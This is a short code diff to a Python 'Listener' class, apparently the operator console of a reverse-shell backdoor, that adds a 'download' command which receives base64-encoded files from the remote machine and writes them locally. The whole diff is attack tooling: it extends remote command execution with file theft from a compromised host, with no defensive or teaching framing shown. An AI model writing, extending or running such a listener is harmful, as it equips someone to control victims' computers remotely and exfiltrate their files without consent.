@@ -1,4 +1,4 @@
-import socket, json
+import socket, json, base64
 
 class Listener:
     def __init__(self, ip, port):
@@ -23,6 +23,11 @@ class Listener:
             except ValueError:
                 continue
 
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Download successful !"
+
     def execute_remotely(self, command):
         self.reliable_send(command)
         if (command[0] == "exit"):
@@ -35,6 +40,8 @@ class Listener:
             command = input(">> ")
             command = command.split(" ")
             result = self.execute_remotely(command)
+            if (command[0] == "download"):
+                result = self.write_file(command[1], result)
             print(result)
 
 
